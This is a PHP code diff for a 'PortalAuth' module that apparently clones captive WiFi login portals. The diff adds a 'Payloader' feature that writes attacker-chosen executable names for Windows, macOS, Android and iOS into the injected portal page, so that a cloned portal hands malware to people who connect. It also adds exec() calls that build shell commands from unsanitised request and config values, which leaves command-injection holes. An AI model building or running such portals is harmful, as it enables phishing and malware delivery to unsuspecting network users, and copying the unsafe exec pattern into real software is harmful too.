@@ -46,7 +46,6 @@ if (!empty($_FILES)) {
 		$name = $file['name'];
 		$type = pathinfo($file['name'], PATHINFO_EXTENSION);
 		
-		
 		switch ($type) {
 			case 'exe':
 				$dest = __WINDL__;
@@ -95,6 +94,9 @@ class PortalAuth extends Module
 {
 	public function route() {
 		switch($this->request->action) {
+			case 'depends':
+				$this->depends($this->request->params);
+				break;
 			case 'getConfigs':
 				$this->getConfigs();
 				break;
@@ -126,7 +128,7 @@ class PortalAuth extends Module
 				$this->clonedPortalExists($this->request->name);
 				break;
 			case 'clonePortal':
-				$this->clonePortal($this->request->name, $this->request->options, $this->request->inject);
+				$this->clonePortal($this->request->name, $this->request->options, $this->request->inject, $this->request->payloads);
 				break;
 			case 'checkPASSRunning':
 				$this->getPID();
@@ -240,6 +242,21 @@ class PortalAuth extends Module
 			$this->respond(true, null, $configs);
 	}
 	
+	private function depends($action) {
+		$retData = array();
+		exec(__SCRIPTS__ . "depends.sh " . $action, $retData);
+		switch (implode(" ", $retData)) {
+			case 'Installed':
+				$this->respond(true);
+				break;
+			case 'Complete':
+				$this->respond(true);
+				break;
+			default:
+				$this->respond(false);
+		}
+	}
+	
 	//======================//
 	//    MISC FUNCTIONS    //
 	//======================//
@@ -276,18 +293,59 @@ class PortalAuth extends Module
 	
 	private function portalExists() {
 		$configs = $this->loadConfigData();
-		if (strcmp(file_get_contents($configs['testSite']), $configs['dataExpected']) == 0) {
+		$pageData = [];
+		exec("curl " . $configs['testSite'], $pageData);
+		if (strcmp($pageData[0], $configs['dataExpected']) == 0) {
 			$this->respond(false);
 		} else {
 			$this->respond(true);
 		}
 	}
 	
-	function clonePortal($name, $opts, $injectionSet) {
+	private function clonePortal($name, $opts, $injectionSet, $payloads) {
+		
 		$configs = $this->loadConfigData();
 		if ($this->clonedPortalExists($name)) {
 			// Delete the current portal
 			$this->rrmdir($configs['p_archive'] . $name);
+		}
+		
+		// If injectSet is Payloader we need to clone the set
+		// modify the contents to match the supplied payloads
+		// and pass in the clone as --injectSet
+
+		$clonedSet = false;
+		if ($injectionSet == "Payloader") {
+			
+			// Make a copy of the Payloader injection set
+			$clonedSet = $this->cloneInjectionSet("Payloader");
+			if (!$clonedSet) {
+				$this->respond(false);
+				return;
+			}
+			
+			// Add the payload paths to the cloned injection set
+			$injectphp = file_get_contents(__INJECTS__ . $clonedSet . "/injectPHP.txt");
+			
+			$payloadArr = json_decode($payloads);
+			foreach ($payloadArr as $payloadType => $payloadName) {
+				if ($payloadType == "windows") {
+					$injectphp = str_replace("<EXE>", $payloadName, $injectphp);
+				} else if ($payloadType == "osx") {
+					$injectphp = str_replace("<APP>", $payloadName, $injectphp);
+				} else if ($payloadType == "android") {
+					$injectphp = str_replace("<APK>", $payloadName, $injectphp);
+				} else if ($payloadType == "ios") {
+					$injectphp = str_replace("<IPA>", $payloadName, $injectphp);
+				}
+			}
+			
+			// Overwrite InjectPHP in the cloned set
+			file_put_contents(__INJECTS__ . $clonedSet . "/injectPHP.txt", $injectphp);
+			
+			// Use the cloned set instead of the Payloader template
+			$injectionSet = $clonedSet;
+			
 		}
 		
 		// Build a params dictionary
@@ -317,7 +375,7 @@ class PortalAuth extends Module
 				$argString .= " $k $v";
 			}
 		}
-
+		
 		/*
 		$this->respond(false, "python portalclone.py $argString");
 		return;
@@ -325,6 +383,15 @@ class PortalAuth extends Module
 		
 		$data = array();
 		$res = exec("python " . __SCRIPTS__ . "portalclone.py" . $argString ." 2>&1", $data);
+		
+		// If Payloader was used then delete the cloned directory
+		if ($clonedSet) {
+			if (!$this->deleteInjectionSet($clonedSet)) {
+				$this->logError("Payloader_Cleanup", "Failed to remove clone of Payloader at " . __INJECTS__ . $clonedSet);
+			}
+		}
+		
+		// Check if the clone was successful
 		if ($res == "Complete") {
 			$this->respond(true);
 			return;
@@ -502,6 +569,38 @@ class PortalAuth extends Module
 		
 		$this->respond(true);
 		return true;
+	}
+	
+	private function cloneInjectionSet($set) {
+		
+		// Create a random name for the cloned directory
+		do {
+			$newDir = $set . "-" . substr(md5(rand()), 0, 5);
+		} while (file_exists(__INJECTS__ . $newDir));
+		
+		// Create the new directory
+		if (!mkdir(__INJECTS__ .$newDir)) {
+			$this->logError("Injection_Set_Clone_Error", "Failed to create root directory");
+			$this->respond(false);
+			return false;
+		}
+		
+		// Copy the files from the original to the new
+		$sourceDir = __INJECTS__ . $set . "/";
+		$destDir = __INJECTS__ . $newDir . "/";
+		foreach (scandir($sourceDir) as $file) {
+			if ($file == "." || $file == ".." || $file == "backups") {continue;}
+			if (!copy($sourceDir . $file, $destDir . $file)) {
+				$this->logError("Injection_Set_Clone_Error", "Failed to create the following file: " . $file);
+				return false;
+			}
+			
+			// Change the permissions on the copied file
+			chmod($destDir . $file, 0755);
+		}
+		
+		// This returns the name of the directory that was cloned
+		return $newDir;
 	}
 	
 	private function exportInjectionSet($setName) {
